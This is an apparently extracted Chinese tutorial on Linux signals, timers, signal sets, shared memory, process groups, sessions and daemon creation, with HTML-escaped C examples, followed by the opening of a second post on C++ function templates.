sig：要发送的信号//返回值// - 成功返回0// - 失败返回 abort函数123void abort(void);//功能：发送SIGABRT信号给当前的进程，杀死当前进程kill(getpid,SIGABRT); 案例123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;signal.h&gt;#include&lt;unistd.h&gt;int main()&#123; pid_t pid = fork(); if (pid == 0) &#123; //子进程 int i = 0; for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;chile process\\n&quot;); sleep(1); &#125; &#125; else if (pid &gt; 0) &#123; //父进程 printf(&quot;parent process\\n&quot;); sleep(2); printf(&quot;kill child process now\\n&quot;); kill(pid, SIGINT); &#125;&#125; 编译运行 12345678910#include&lt;unistd.h&gt;unsigned int alarm(unsigned int seconds);//功能：设置定时器（闹钟），函数调用开始倒计时，当倒计时为0的时候，函数会给当前的进程发送一个信号：SIGALARM//参数：// - seconds：倒计时的时长，单位：秒。如果参数为0，定时器无效（不进行倒计时，不发送信号）// 取消一个定时器，通过alarm(0);//返回值：// - 之前没有定时器，返回0// - 之前有定时器，返回之前的定时器剩余的时间//- SIGALARM：默认终止当前的进程，每个进程都有且只有唯一的一个定时器 案例1 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;signal.h&gt;#include&lt;unistd.h&gt;int main()&#123; pid_t pid = fork(); if (pid == 0) &#123; //子进程 int i = 0; for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;chile process\\n&quot;); sleep(1); &#125; &#125; else if (pid &gt; 0) &#123; //父进程 printf(&quot;parent process\\n&quot;); sleep(2); printf(&quot;kill child process now\\n&quot;); kill(pid, SIGINT); &#125;&#125; 运行结果为： 案例2 计算一秒钟电脑能数多少个数 123456789101112#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;int main()&#123; alarm(1); int i = 0; while (1) &#123; printf(&quot;%d\\n&quot;, i++); &#125;&#125; 运行结果为： 可以运行命令 1./alarm1 &gt;&gt;a.txt 将此文件的输出结果放到a.txt中 实际时间 &#x3D; 内核时间 + 用户时间 +消耗的时间 进行文件IO操作比较浪费时间 定时器与进程的状态无关（自然定时法）。无论进程处于什么状态，alarm都会计时 setitimer定时器函数12345678910111213141516171819202122232425#include&lt;sys/time.h&gt;int setitimer(int which, const struct itimerval* new_value, struct itimerval* old_value);//功能：设置定时器（闹钟）。可以替代alarm函数。精度微妙us，实现周期性定时//参数// - which:定时器以什么时间计时// ITIMER_REAL：真实时间，时间到达，发送SIGALARM信号，常用// ITIMER_VIRTUAL：用户时间，时间到达，发送SIGVTALRM信号// ITIMER_PROF：以该进程在用户态和内核态下所消耗的时间来计算，时间到达发送SIGPROF信号// - new_calue:设置定时器的属性// struct itimerval &#123; //定时器结构体// struct timeval it_interval; /* Interval for periodic timer */ //每个间断的时间// struct timeval it_value; /* Time until next expiration */ //延迟多长时间执行定时器// &#125;;// struct timeval &#123; //时间的结构体// time_t tv_sec; /* seconds */ //秒数// suseconds_t tv_usec; /* microseconds */ //微秒// &#125;;// 过10秒后每个两秒定时一次// - old_value：记录上一次的定时的时间参数，指定NULL//返回值：// - 成功返回0// - 错误返回-1并设置错误号 案例 123456789101112131415161718192021222324#include&lt;sys/time.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//过三秒以后每个两秒定时一次int main()&#123; struct itimerval new_value; //设置间隔时间值 new_value.it_interval.tv_sec = 2; new_value.it_interval.tv_usec = 0; //设置延迟的时间 new_value.it_value.tv_sec = 3; new_value.it_value.tv_usec = 0; int ret = setitimer(ITIMER_REAL, &amp;new_value, NULL);//非阻塞的 printf(&quot;定时器开始了.....\\n&quot;); if (ret == -1) &#123; perror(&quot;setitimer&quot;); exit(0); &#125; getchar();&#125; 编译运行 signal信号捕捉函数123456789101112131415161718#include &lt;signal.h&gt;typedef void (*sighandler_t)(int);//一个函数指针sighandler_t signal(int signum, sighandler_t handler);//功能：设置某个信号的捕捉行为//参数：// - signum：要捕捉的信号// - handler：捕捉到信号要如何处理// - SIG_IGN：忽略信号// - SIG_DFL：使用信号默认行为// - 回调函数：这个函数是内核调用，程序员只负责写，捕捉到信号后如何处理信号// - 回调函数需要程序员实现并且提前准备好，函数的类型根据实际需求，一般看函数指针的定义// - 不是程序员调用，而是当信号产生，内核调用// - 函数指针是实现回调的手段，函数实现之后，将函数名放到函数指针的位置//返回值：// - 成功：返回上一次注册的信号处理函数的地址，第一次调用返回NULL// - 失败：返回SIG_ERR，设置错误号//SIGKILL和SIGSTOP不能被捕捉不能被忽略 案例 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;sys/time.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;signal.h&gt;//过三秒以后每个两秒定时一次void myalarm(int num)&#123; printf(&quot;捕捉到的信号的编号是%d\\n&quot;, num); printf(&quot;---------------------------\\n&quot;);&#125;int main()&#123; //注册信号捕捉 //signal(SIGALRM,SIG_DFL) //signal(SIGALRM, SIG_DFL); __sighandler_t ret = signal(SIGALRM, myalarm); if (ret == SIG_ERR) &#123; perror(&quot;signal&quot;); exit(0); &#125; struct itimerval new_value; //设置间隔时间值 new_value.it_interval.tv_sec = 2; new_value.it_interval.tv_usec = 0; //设置延迟的时间 new_value.it_value.tv_sec = 3; new_value.it_value.tv_usec = 0; int ret1 = setitimer(ITIMER_REAL, &amp;new_value, NULL);//非阻塞的 printf(&quot;定时器开始了.....\\n&quot;); if (ret1 == -1) &#123; perror(&quot;setitimer&quot;); exit(0); &#125; getchar();&#125; 编译运行 信号集及其相关函数 许多信号相关的系统调用都需要能表示一组不同的信号，多个信号可使用一个称之为信号集的数据结构来表示，其系统数据类型为 sigset_t。 在 PCB 中有两个非常重要的信号集。一个称之为 “阻塞信号集” ，另一个称之为“未决信号集” 。这两个信号集都是内核使用位图机制来实现的。但操作系统不允许我们直接对这两个信号集进行位操作。而需自定义另外一个集合，借助信号集操作函数来对 PCB 中的这两个信号集进行修改。 信号的 “未决” 是一种状态，指的是从信号的产生到信号被处理前的这一段时间。 信号的 “阻塞” 是一个开关动作，指的是阻止信号被处理，但不是阻止信号产生。 信号的阻塞就是让系统暂时保留信号留待以后发送。由于另外有办法让系统忽略信号，所以一般情况下信号的阻塞只是暂时的，只是为了防止信号打断敏感的操作。 阻塞信号集和未决信号集 1.用户通过键盘 Ctrl + C, 产生2号信号SIGINT (信号被创建) 2.信号产生但是没有被处理 （未决） - 在内核中将所有的没有被处理的信号存储在一个集合中 （未决信号集） - SIGINT信号状态被存储在第二个标志位上 - 这个标志位的值为0， 说明信号不是未决状态 - 这个标志位的值为1， 说明信号处于未决状态 3.这个未决状态的信号，需要被处理，处理之前需要和另一个信号集（阻塞信号集），进行比较 - 阻塞信号集默认不阻塞任何的信号 - 如果想要阻塞某些信号需要用户调用系统的API 4.在处理的时候和阻塞信号集中的标志位进行查询，看是不是对该信号设置阻塞了 - 如果没有阻塞，这个信号就被处理 - 如果阻塞了，这个信号就继续处于未决状态，直到阻塞解除，这个信号就被处理 信号集函数自定义信号集函数123456789101112131415161718192021222324252627282930313233int sigemptyset(sigset_t *set);// - 功能：清空信号集中的数据,将信号集中的所有的标志位置为0// - 参数：set,传出参数，需要操作的信号集// - 返回值：成功返回0， 失败返回-1int sigfillset(sigset_t *set);// - 功能：将信号集中的所有的标志位置为1// - 参数：set,传出参数，需要操作的信号集// - 返回值：成功返回0， 失败返回-1int sigaddset(sigset_t *set, int signum);// - 功能：设置信号集中的某一个信号对应的标志位为1，表示阻塞这个信号// - 参数：// - set：传出参数，需要操作的信号集// - signum：需要设置阻塞的那个信号// - 返回值：成功返回0， 失败返回-1int sigdelset(sigset_t *set, int signum);// - 功能：设置信号集中的某一个信号对应的标志位为0，表示不阻塞这个信号// - 参数：// - set：传出参数，需要操作的信号集// - signum：需要设置不阻塞的那个信号// - 返回值：成功返回0， 失败返回-1int sigismember(const sigset_t *set, int signum);// - 功能：判断某个信号是否阻塞// - 参数：// - set：需要操作的信号集// - signum：需要判断的那个信号// - 返回值：// 1 ： signum被阻塞// 0 ： signum不阻塞// -1 ： 失败 案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include&lt;signal.h&gt;#include&lt;stdio.h&gt;int main()&#123; //创建一个信号集 sigset_t set; //清空信号集的内容 sigemptyset(&amp;set); //判断SIGINT是否在set里面 int ret = sigismember(&amp;set, SIGINT); if (ret == 0) &#123; printf(&quot;SIGINT不阻塞\\n&quot;); &#125; else if (ret == 1) &#123; printf(&quot;SIGINT阻塞\\n&quot;); &#125; //添加几个信号到信号集中 sigaddset(&amp;set, SIGINT); sigaddset(&amp;set, SIGQUIT); //判断SIGINT是否在信号集中 ret = sigismember(&amp;set, SIGINT); if (ret == 0) &#123; printf(&quot;SIGINT不阻塞\\n&quot;); &#125; else if (ret == 1) &#123; printf(&quot;SIGINT阻塞\\n&quot;); &#125; //判断SIGQUIT是否在信号集中 ret = sigismember(&amp;set, SIGQUIT); if (ret == 0) &#123; printf(&quot;SIGQUIT不阻塞\\n&quot;); &#125; else if (ret == 1) &#123; printf(&quot;SIGQUIT阻塞\\n&quot;); &#125; //从信号集中删除一个信号 sigdelset(&amp;set, SIGQUIT); //判断SIGQUIT是否在信号集中 ret = sigismember(&amp;set, SIGQUIT); if (ret == 0) &#123; printf(&quot;SIGQUIT不阻塞\\n&quot;); &#125; else if (ret == 1) &#123; printf(&quot;SIGQUIT阻塞\\n&quot;); &#125;&#125; 编译运行 系统信号集函数1234567891011121314151617181920int sigprocmask(int how, const sigset_t* set, sigset_t* oldset);// -功能：将自定义信号集中的数据设置到内核中（设置阻塞，解除阻塞，替换）// - 参数：// - how : 如何对内核阻塞信号集进行处理// SIG_BLOCK : 将用户设置的阻塞信号集添加到内核中，内核中原来的数据不变// 假设内核中默认的阻塞信号集是mask， mask | set// SIG_UNBLOCK : 根据用户设置的数据，对内核中的数据进行解除阻塞// mask &amp;= ~set// SIG_SETMASK : 覆盖内核中原来的值// - set ：已经初始化好的用户自定义的信号集// - oldset : 保存设置之前的内核中的阻塞信号集的状态，可以是 NULL// - 返回值：// 成功：0// 失败： - 1// 设置错误号：EFAULT、EINVALint sigpending(sigset_t * set);// - 功能：获取内核中的未决信号集// - 参数：set, 传出参数，保存的是内核中的未决信号集中的信息。 案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//编写一个程序，把所有的常规信号（1 - 31）的未决状态打印到屏幕//设置某些信号是阻塞的，通过键盘产生这些信号#include&lt;stdio.h&gt;#include&lt;signal.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;int main()&#123; //设置2、3号信号阻塞 sigset_t set; sigemptyset(&amp;set); //将2号和3号信号添加到信号集中 sigaddset(&amp;set, SIGINT); sigaddset(&amp;set, SIGQUIT); //修改内核中的阻塞信号集 sigprocmask(SIG_BLOCK, &amp;set, NULL); while (1) &#123; //获取当前的未决信号集的数据 sigset_t pendingset; sigemptyset(&amp;pendingset); sigpending(&amp;pendingset); //遍历前32位 for (int i = 1;i &lt;= 32;i++) &#123; if (sigismember(&amp;pendingset, i) == 1) &#123; printf(&quot;1&quot;); &#125; else if (sigismember(&amp;pendingset, i) == 0) &#123; printf(&quot;0&quot;); &#125; else &#123; perror(&quot;sigismember&quot;); exit(0); &#125; &#125; printf(&quot;\\n&quot;); sleep(1); &#125;&#125; 编译运行 sigaction信号捕捉函数1234567891011121314151617181920212223242526#include &lt;signal.h&gt;int sigaction(int signum, const struct sigaction* act, struct sigaction* oldact);// -功能：检查或者改变信号的处理。信号捕捉// - 参数：// - signum : 需要捕捉的信号的编号或者宏值（信号的名称）// - act ：捕捉到信号之后的处理动作// - oldact : 上一次对信号捕捉相关的设置，一般不使用，传递NULL// - 返回值：// 成功 0// 失败 - 1struct sigaction &#123; // 函数指针，指向的函数就是信号捕捉到之后的处理函数 void (*sa_handler)(int); // 不常用 void (*sa_sigaction)(int, siginfo_t*, void*); // 临时阻塞信号集，在信号捕捉函数执行过程中，临时阻塞某些信号。 sigset_t sa_mask; // 使用哪一个信号处理对捕捉到的信号进行处理 // 这个值可以是0，表示使用sa_handler,也可以是SA_SIGINFO表示使用sa_sigaction int sa_flags; // 被废弃掉了 void (*sa_restorer)(void);&#125;; 案例 123456789101112131415161718192021222324252627282930313233343536373839#include&lt;sys/time.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;signal.h&gt;//过三秒以后每个两秒定时一次void myalarm(int num)&#123; printf(&quot;捕捉到的信号的编号是%d\\n&quot;, num); printf(&quot;---------------------------\\n&quot;);&#125;int main()&#123; struct sigaction act; act.sa_flags = 0; act.sa_handler = myalarm; sigemptyset(&amp;act.sa_mask);//清空临时阻塞信号集 sigaction(SIGALRM, &amp;act, NULL); struct itimerval new_value; //设置间隔时间值 new_value.it_interval.tv_sec = 2; new_value.it_interval.tv_usec = 0; //设置延迟的时间 new_value.it_value.tv_sec = 3; new_value.it_value.tv_usec = 0; int ret1 = setitimer(ITIMER_REAL, &amp;new_value, NULL);//非阻塞的 printf(&quot;定时器开始了.....\\n&quot;); if (ret1 == -1) &#123; perror(&quot;setitimer&quot;); exit(0); &#125; getchar();&#125; 编译运行： 内核信号被捕捉的过程 SIGCHID信号 SIGCHLD信号产生的条件 子进程终止时 子进程接收到 SIGSTOP 信号停止时 子进程处在停止态，接受到SIGCONT后唤醒时 以上三种条件都会给父进程发送 SIGCHLD 信号，父进程默认会忽略该信号 案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;signal.h&gt;#include&lt;wait.h&gt;void myFun(int num)&#123; printf(&quot;捕捉到的信号:%d\\n&quot;, num); //回收子进程PCB的资源 while (1) &#123; int ret = waitpid(-1, NULL, WNOHANG); if (ret &gt; 0) &#123; printf(&quot;child die , pid = %d \\n&quot;, ret); &#125; else if (ret == 0) &#123; //说明还有子进程活着 break; &#125; &#125;&#125;int main()&#123; //提前设置好阻塞信号集，阻塞SIGCHLD，因为可能子进程很快结束，父进程还没有注册完信号捕捉 sigset_t set; sigemptyset(&amp;set); sigaddset(&amp;set, SIGCHLD); sigprocmask(SIG_BLOCK, &amp;set, NULL); pid_t pid; for (int i = 0;i &lt; 20;i++) &#123; pid = fork(); if (pid == 0) &#123; break; &#125; &#125; if (pid &gt; 0) &#123; //父进程 //捕捉子进程死亡时发送的SIGCHLD信号 struct sigaction act; act.sa_flags = 0; act.sa_handler = myFun; sigemptyset(&amp;act.sa_mask); sigaction(SIGCHLD, &amp;act, NULL); //注册完信号捕捉以后，解除阻塞 sigprocmask(SIG_UNBLOCK, &amp;set, NULL); while (1) &#123; printf(&quot;parent process pid : %d\\n&quot;, getpid()); sleep(2); &#125; &#125; else if (pid == 0) &#123; //子进程 printf(&quot;child process pid : %d\\n&quot;, getpid()); &#125;&#125; 编译运行 共享内存 共享内存允许两个或者多个进程共享物理内存的同一块区域（通常被称为段）。由于一个共享内存段会称为一个进程用户空间的一部分，因此这种 IPC 机制无需内核介入。所有需要做的就是让一个进程将数据复制进共享内存中，并且这部分数据会对其他所有共享同一个段的进程可用。 与管道等要求发送进程将数据从用户空间的缓冲区复制进内核内存和接收进程将数据从内核内存复制进用户空间的缓冲区的做法相比，这种 IPC 技术的速度更快。 共享内存使用步骤 调用 shmget() 创建一个新共享内存段或取得一个既有共享内存段的标识符（即由其他进程创建的共享内存段）。这个调用将返回后续调用中需要用到的共享内存标识符。 使用 shmat() 来附上共享内存段，即使该段成为调用进程的虚拟内存的一部分。 此刻在程序中可以像对待其他可用内存那样对待这个共享内存段。为引用这块共享内存，程序需要使用由 shmat() 调用返回的 addr 值，它是一个指向进程的虚拟地址空间中该共享内存段的起点的指针。 调用 shmdt() 来分离共享内存段。在这个调用之后，进程就无法再引用这块共享内存了。这一步是可选的，并且在进程终止时会自动完成这一步。 调用 shmctl() 来删除共享内存段。只有当当前所有附加内存段的进程都与之分离之后内存段才会销毁。只有一个进程需要执行这一步。 共享内存相关的函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//共享内存相关的函数#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;int shmget(key_t key, size_t size, int shmflg); // - 功能：创建一个新的共享内存段，或者获取一个既有的共享内存段的标识。 // 新创建的内存段中的数据都会被初始化为0 // - 参数： // - key : key_t类型是一个整形，通过这个找到或者创建一个共享内存。 // 一般使用16进制表示，非0值 // - size: 共享内存的大小 // - shmflg: 属性 // - 访问权限 // - 附加属性：创建/判断共享内存是不是存在 // - 创建：IPC_CREAT // - 判断共享内存是否存在： IPC_EXCL , 需要和IPC_CREAT一起使用 // IPC_CREAT | IPC_EXCL | 0664 // - 返回值： // 失败：-1 并设置错误号 // 成功：&gt;0 返回共享内存的引用的ID，后面操作共享内存都是通过这个值。void *shmat(int shmid, const void *shmaddr, int shmflg); // - 功能：和当前的进程进行关联 // - 参数： // - shmid : 共享内存的标识（ID）,由shmget返回值获取 // - shmaddr: 申请的共享内存的起始地址，指定NULL，内核指定 // - shmflg : 对共享内存的操作 // - 读 ： SHM_RDONLY, 必须要有读权限 // - 读写： 0 // - 返回值： // 成功：返回共享内存的首（起始）地址。 失败(void *) -1int shmdt(const void *shmaddr); // - 功能：解除当前进程和共享内存的关联 // - 参数： // shmaddr：共享内存的首地址 // - 返回值：成功 0， 失败 -1int shmctl(int shmid, int cmd, struct shmid_ds *buf); // - 功能：对共享内存进行操作。删除共享内存，共享内存要删除才会消失，创建共享内存的进行被销毁了对共享内存是没有任何影响。 // - 参数： // - shmid: 共享内存的ID // - cmd : 要做的操作 // - IPC_STAT : 获取共享内存的当前的状态 // - IPC_SET : 设置共享内存的状态 // - IPC_RMID: 标记共享内存被销毁 // - buf：需要设置或者获取的共享内存的属性信息 // - IPC_STAT : buf存储数据 // - IPC_SET : buf中需要初始化数据，设置到内核中 // - IPC_RMID : 没有用，NULLkey_t ftok(const char *pathname, int proj_id); // - 功能：根据指定的路径名，和int值，生成一个共享内存的key // - 参数： // - pathname:指定一个存在的路径 // - proj_id: int类型的值，但是这系统调用只会使用其中的1个字节 // 范围 ： 0-255 一般指定一个字符 &#x27;a&#x27; 案例：使用共享内存进行通信write.c 12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;sys/ipc.h&gt;#include&lt;sys/shm.h&gt;#include&lt;string.h&gt;int main()&#123; //1、创建一个共享内存 int shmid = shmget(100, 4096, IPC_CREAT | 0664); printf(&quot;shmid : %d\\n&quot;, shmid); //2、和当前进程进行关联 void* ptr = shmat(shmid, NULL, 0); char* str = &quot;hello world&quot;; //3、写数据 memcpy(ptr, str, strlen(str) + 1); printf(&quot;按任意键继续\\n&quot;); getchar(); //4、解除关联 shmdt(ptr); //5、删除共享内存 shmctl(shmid, IPC_RMID, NULL);&#125; read.c 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#include&lt;sys/ipc.h&gt;#include&lt;sys/shm.h&gt;#include&lt;string.h&gt;int main()&#123; //1、获取一个共享内存 int shmid = shmget(100, 0, IPC_CREAT); printf(&quot;shmid : %d\\n&quot;, shmid); //2、和当前进程进行关联 void* ptr = shmat(shmid, NULL, 0); //3、读数据 printf(&quot;%s\\n&quot;, (char*)ptr); printf(&quot;按任意键继续\\n&quot;); getchar(); //4、解除关联 shmdt(ptr); //5、删除共享内存 shmctl(shmid, IPC_RMID, NULL);&#125; 分别编译运行 思考问题 问题1：操作系统如何知道一块共享内存被多少个进程关联？ - 共享内存维护了一个结构体struct shmid_ds 这个结构体中有一个成员 shm_nattch - shm_nattach 记录了关联的进程个数 问题2：可不可以对共享内存进行多次删除 shmctl - 可以的 - 因为shmctl 标记删除共享内存，不是直接删除 - 什么时候真正删除呢? 当和共享内存关联的进程数为0的时候，就真正被删除 - 当共享内存的key为0的时候，表示共享内存被标记删除了 如果一个进程和共享内存取消关联，那么这个进程就不能继续操作这个共享内存。也不能进行关联。 共享内存和内存映射的区别 1.共享内存可以直接创建，内存映射需要磁盘文件（匿名映射除外） 2.共享内存效果更高 3.内存 所有的进程操作的是同一块共享内存。 内存映射，每个进程在自己的虚拟地址空间中有一个独立的内存。 4.数据安全 - 进程突然退出 共享内存还存在 内存映射区消失 - 运行进程的电脑死机，宕机了 数据存在在共享内存中，没有了 内存映射区的数据 ，由于磁盘文件中的数据还在，所以内存映射区的数据还存在。 5.生命周期 - 内存映射区：进程退出，内存映射区销毁 - 共享内存：进程退出，共享内存还在，标记删除（所有的关联的进程数为0），或者关机 如果一个进程退出，会自动和共享内存进行取消关联。 共享内存操作命令 ipcs 用法 ipcs -a &#x2F;&#x2F; 打印当前系统中所有的进程间通信方式的信息 ipcs -m &#x2F;&#x2F; 打印出使用共享内存进行进程间通信的信息 ipcs -q &#x2F;&#x2F; 打印出使用消息队列进行进程间通信的信息 ipcs -s &#x2F;&#x2F; 打印出使用信号进行进程间通信的信息 ipcrm 用法 ipcrm -M shmkey &#x2F;&#x2F; 移除用shmkey创建的共享内存段 ipcrm -m shmid &#x2F;&#x2F; 移除用shmid标识的共享内存段 ipcrm -Q msgkey &#x2F;&#x2F; 移除用msqkey创建的消息队列 ipcrm -q msqid &#x2F;&#x2F; 移除用msqid标识的消息队列 ipcrm -S semkey &#x2F;&#x2F; 移除用semkey创建的信号 ipcrm -s semid &#x2F;&#x2F; 移除用semid标识的信号 守护进程终端 在 UNIX 系统中，用户通过终端登录系统后得到一个 shell 进程，这个终端成为 shell 进程的控制终端（Controlling Terminal），进程中，控制终端是保存在 PCB 中的信息，而 fork() 会复制 PCB 中的信息，因此由 shell 进程启动的其它进程的控制终端也是这个终端。 可以通过命令 1echo $$ 查看当前shell的进程号 默认情况下（没有重定向），每个进程的标准输入、标准输出和标准错误输出都指向控制终端，进程从标准输入读也就是读用户的键盘输入，进程往标准输出或标准错误输出写也就是输出到显示器上。 在控制终端输入一些特殊的控制键可以给前台进程发信号，例如 Ctrl + C 会产生 SIGINT 信号，Ctrl + \\ 会产生 SIGQUIT 信号 进程组 进程组和会话在进程之间形成了一种两级层次关系：进程组是一组相关进程的集合，会话是一组相关进程组的集合。进程组和会话是为支持 shell 作业控制而定义的抽象概念，用户通过 shell 能够交互式地在前台或后台运行命令。 进行组由一个或多个共享同一进程组标识符（PGID）的进程组成。一个进程组拥有一个进程组首进程，该进程是创建该组的进程，其进程 ID 为该进程组的 ID，新进程会继承其父进程所属的进程组 ID。 进程组拥有一个生命周期，其开始时间为首进程创建组的时刻，结束时间为最后一个成员进程退出组的时刻。一个进程可能会因为终止而退出进程组，也可能会因为加入了另外一个进程组而退出进程组。进程组首进程无需是最后一个离开进程组的成员。 会话 会话是一组进程组的集合。会话首进程是创建该新会话的进程，其进程 ID 会成为会话 ID。新进程会继承其父进程的会话 ID。 一个会话中的所有进程共享单个控制终端。控制终端会在会话首进程首次打开一个终端设备时被建立。一个终端最多可能会成为一个会话的控制终端。 在任一时刻，会话中的其中一个进程组会成为终端的前台进程组，其他进程组会成为后台进程组。只有前台进程组中的进程才能从控制终端中读取输入。当用户在控制终端中输入终端字符生成信号后，该信号会被发送到前台进程组中的所有成员。 当控制终端的连接建立起来之后，会话首进程会成为该终端的控制进程。 进程组、会话、控制终端之间的关系 运行的命令为： find / 2 &gt; /dev/null | wc -l &amp; sort &lt; longlist | uniq -c 进程组、会话操作函数12345pid_t getpgrp(void); //获取当前进程的进程组IDpid_t getpgid(pid_t pid); //获取指定进程的进程组IDint setpgid(pid_t pid, pid_t pgid); //设置进程组的IDpid_t getsid(pid_t pid); //获取指定进程的会话的IDpid_t setsid(void); //设置进程的会话ID 守护进程 守护进程（Daemon Process），也就是通常说的 Daemon 进程（精灵进程），Linux 中的后台服务进程。它是一个生存期较长的进程，通常独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。一般采用以 d 结尾的名字。 守护进程具备下列特征： 生命周期很长，守护进程会在系统启动的时候被创建并一直运行直至系统被关闭。 它在后台运行并且不拥有控制终端。没有控制终端确保了内核永远不会为守护进程自动生成任何控制信号以及终端相关的信号（如 SIGINT、SIGQUIT）。 Linux 的大多数服务器就是用守护进程实现的。比如，Internet 服务器 inetd，Web 服务器 httpd 等 守护进程创建步骤 执行一个 fork()，之后父进程退出，子进程继续执行。 子进程调用 setsid() 开启一个新会话。 清除进程的 umask 以确保当守护进程创建文件和目录时拥有所需的权限。 修改进程的当前工作目录，通常会改为根目录（&#x2F;）。 关闭守护进程从其父进程继承而来的所有打开着的文件描述符。 在关闭了文件描述符0、1、2之后，守护进程通常会打开&#x2F;dev&#x2F;null 并使用dup2() 使所有这些描述符指向这个设备。 核心业务逻辑 案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081/* 写一个守护进程，每隔2s获取一下系统时间，将这个时间写入到磁盘文件中。*/#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/time.h&gt;#include &lt;signal.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void work(int num) &#123; // 捕捉到信号之后，获取系统时间，写入磁盘文件 time_t tm = time(NULL); struct tm* loc = localtime(&amp;tm); // char buf[1024]; // sprintf(buf, &quot;%d-%d-%d %d:%d:%d\\n&quot;,loc-&gt;tm_year,loc-&gt;tm_mon // ,loc-&gt;tm_mday, loc-&gt;tm_hour, loc-&gt;tm_min, loc-&gt;tm_sec); // printf(&quot;%s\\n&quot;, buf); char* str = asctime(loc); int fd = open(&quot;time.txt&quot;, O_RDWR | O_CREAT | O_APPEND, 0664); write(fd, str, strlen(str)); close(fd);&#125;int main() &#123; // 1.创建子进程，退出父进程 pid_t pid = fork(); if (pid &gt; 0) &#123; exit(0); &#125; // 2.将子进程重新创建一个会话 setsid(); // 3.设置掩码 umask(022); // 4.更改工作目录 chdir(&quot;/home/plucky/Linux/lecture27&quot;); // 5. 关闭、重定向文件描述符 int fd = open(&quot;/dev/null&quot;, O_RDWR); dup2(fd, STDIN_FILENO); dup2(fd, STDOUT_FILENO); dup2(fd, STDERR_FILENO); // 6.业务逻辑 // 捕捉定时信号 struct sigaction act; act.sa_flags = 0; act.sa_handler = work; sigemptyset(&amp;act.sa_mask); sigaction(SIGALRM, &amp;act, NULL); struct itimerval val; val.it_value.tv_sec = 2; val.it_value.tv_usec = 0; val.it_interval.tv_sec = 2; val.it_interval.tv_usec = 0; // 创建定时器 setitimer(ITIMER_REAL, &amp;val, NULL); // 不让进程结束 while (1) &#123; sleep(10); &#125; return 0;&#125; 编译运行 因为是守护进程，所以会新建一个会话，我们从控制终端上进行的操作不会影响到守护进程的执行，只能通过kill命令杀死守护进程","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"进程","slug":"进程","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B/"}]},{"title":"C++学习 模板","slug":"C++-学习-模板","date":"2023-05-07T11:42:34.000Z","updated":"2023-05-09T11:17:37.233Z","comments":true,"path":"2023/05/07/C++-学习-模板/","link":"","permalink":"http://example.com/2023/05/07/C++-%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/","excerpt":"模板的概念模板就是建立一个通用的模具，大大提高复用性 模板的特点：","text":"模板的概念模板就是建立一个通用的模具，大大提高复用性 模板的特点： 不能直接使用，他只是一个框架 模板的通用并不是万能的 函数模板 C++另一种编程思想称为泛型编程，主要利用的技术就是模板 C++提供两种模板机制：函数模板和类模板 函数模板语法函数模板作用： 建立一个通用函数，其函数返回值类型和形参类型可以不具体指定用一个虚拟的类型来代表 语法 12template&lt;typename T&gt;函数声明或定义 解释 template — 声明创建模板 typename — 表明其后面的符号是一种符号类型，可以用class代替 T — 通用的数据类型，名称可以替换，通常为大写字母 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//函数模板//两个整形交换函数void swapInt(int&amp; a, int&amp; b)&#123; int temp = a; a = b; b = temp;&#125;//交换两个浮点型函数void swapDouble(double&amp; a, double&amp; b)&#123; double temp = a; a = b; b = temp;&#125;//函数模板template&lt;typename T&gt;//声明一个模板，告诉编译器后面代码中紧跟着的T不要报错，T是一个通用数据类型void mySwap(T&amp; a, T&amp; b)&#123; T temp = a; a = b; b = temp;&#125;void test01()&#123; int a = 10; int b = 20; swapInt(a, b); cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl; //利用函数模板，两种方式使用 //1、自动类型推导 mySwap(a, b); cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl; //显式指定类型 mySwap&lt;int&gt;(a, b); cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = 